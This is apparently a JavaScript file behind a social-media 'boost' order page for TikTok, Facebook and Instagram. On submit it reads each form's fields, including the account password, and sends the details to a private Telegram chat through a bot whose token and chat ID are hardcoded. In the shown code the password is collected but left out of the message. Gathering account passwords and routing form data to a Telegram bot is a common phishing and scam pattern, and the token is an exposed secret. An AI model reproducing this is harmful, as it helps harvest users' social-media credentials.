
document.addEventListener("DOMContentLoaded", () => {
    const TELEGRAM_BOT_TOKEN = "7738217538:AAGoNIvjMilJ5Ikt9oalHhpEiRDtS7t3NbU";
    const CHAT_ID = "6804915795";

    function sendToTelegram(platform, data) {
        const message = `
📢 **Boost Request - ${platform}** 📢
- Account Name: ${data.accountName}
- Post/Video URL: ${data.url}
- Boost Type: ${data.boostType}
- Quantity: ${data.quantity}
        `;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }),
        })
        .then(response => response.ok ? alert("Request sent successfully!") : alert("Failed to send the request. Please try again."))
        .catch(error => console.error("Error:", error));
    }

    function setupFormListener(formId, platform) {
        const form = document.getElementById(formId);
        if (form) {
            form.addEventListener("submit", event => {
                event.preventDefault();
                const data = {
                    accountName: form.querySelector('input[type="text"]').value,
                    url: form.querySelector('input[type="url"]').value,
                    password: form.querySelector('input[type="password"]').value,
                    boostType: form.querySelector("select").value,
                    quantity: form.querySelector('input[type="number"]').value,
                };
                sendToTelegram(platform, data);
            });
        } else {
            console.error(`Form with ID "${formId}" not found.`);
        }
    }

    setupFormListener("boost-tiktok-form", "TikTok");
    setupFormListener("boost-facebook-form", "Facebook");
    setupFormListener("boost-instagram-form", "Instagram");
});
